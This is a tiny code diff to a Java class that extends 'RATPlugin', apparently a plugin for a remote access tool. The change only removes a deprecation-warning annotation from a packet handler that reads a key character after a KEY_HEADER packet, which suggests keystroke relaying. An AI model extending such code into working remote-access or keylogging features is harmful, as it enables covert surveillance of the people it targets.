@@ -36,7 +36,6 @@ public class Plugin extends RATPlugin {
 
 	}
 
-	@SuppressWarnings("deprecation")
 	public void onPacket(OnPacketEvent event) throws Exception {
 		if (event.getPacket().getHeader() == KEY_HEADER) {
 			char ckey = event.getServer().getDataReader().readChar();
